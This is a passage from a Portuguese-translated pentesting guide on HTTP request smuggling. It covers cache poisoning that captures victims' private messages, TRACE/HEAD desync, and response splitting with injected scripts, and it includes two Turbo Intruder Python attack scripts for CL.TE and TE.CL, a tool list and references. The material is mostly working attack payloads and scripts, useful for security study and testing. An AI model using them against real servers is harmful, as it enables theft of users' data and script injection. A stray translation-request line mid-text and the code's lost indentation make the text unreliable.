`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Se essa requisição, enviada por HTTP Request Smuggling, envenenar uma entrada de cache destinada a conteúdo estático (por exemplo, `/someimage.png`), os dados sensíveis da vítima de `/private/messages` podem ser armazenados nessa entrada de cache do conteúdo estático. Consequentemente, o atacante poderia potencialmente recuperar esses dados sensíveis em cache.

### Abusando do TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) sugere que, se o servidor tiver o método TRACE habilitado, pode ser possível abusar dele com um HTTP Request Smuggling. Isso ocorre porque esse método reflete qualquer header enviado ao servidor como parte do corpo da resposta. Por exemplo:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Por favor cole aqui o conteúdo de src/pentesting-web/http-request-smuggling/README.md que deseja traduzir. Vou traduzir o texto relevante para português mantendo exatamente a mesma sintaxe markdown/html e sem traduzir código, nomes de técnicas, links ou tags.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Um exemplo de como abusar desse comportamento seria smuggle primeiro um HEAD request. Esse request será respondido apenas com os headers de um GET request (**`Content-Type`** entre eles). E smuggle imediatamente após o HEAD um TRACE request, que irá **refletir os dados enviados**.\
Como o HEAD response conterá um `Content-Length` header, a **response do TRACE request será tratada como o body do HEAD response, portanto refletindo dados arbitrários** na response.\
Essa response será enviada para a próxima request na conexão, então isso poderia ser **usado em um arquivo JS em cache, por exemplo, para injetar código JS arbitrário**.

### Abusing TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuar seguindo [**this post**](https://portswigger.net/research/trace-desync-attack) é sugerida outra forma de abusar do método TRACE. Como comentado, ao smuggle um HEAD request e um TRACE request é possível **controlar alguns dados refletidos** na response ao HEAD request. O comprimento do body do HEAD request é basicamente indicado no `Content-Length` header e é formado pela response do TRACE request.

Portanto, a nova ideia seria que, conhecendo esse `Content-Length` e os dados fornecidos na response do TRACE, é possível fazer com que a response do TRACE contenha uma resposta HTTP válida depois do último byte indicado pelo Content-Length, permitindo a um atacante controlar completamente a request para a próxima response (o que poderia ser usado para realizar um cache poisoning).

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Gerará estas respostas (note que a resposta HEAD tem um Content-Length, fazendo com que a resposta TRACE seja parte do corpo da HEAD e, uma vez que o Content-Length da HEAD termina, uma resposta HTTP válida é smuggled):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Explorando HTTP Request Smuggling com HTTP Response Desynchronisation

Encontrou alguma vulnerabilidade de HTTP Request Smuggling e não sabe como explorá-la? Experimente este outro método de exploração:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Outras técnicas de HTTP Request Smuggling

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Scripts do Turbo Intruder

### CL.TE

Fonte: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Fonte: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Ferramentas

- HTTP Hacker (Burp BApp Store) – visualizar concatenação/framing e comportamento HTTP de baixo nível
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta é um HTTP Fuzzer baseado em gramática, útil para encontrar discrepâncias estranhas de request smuggling.

## Referências

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Cuidado com o falso falso‑positivo: como distinguir HTTP pipelining de request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
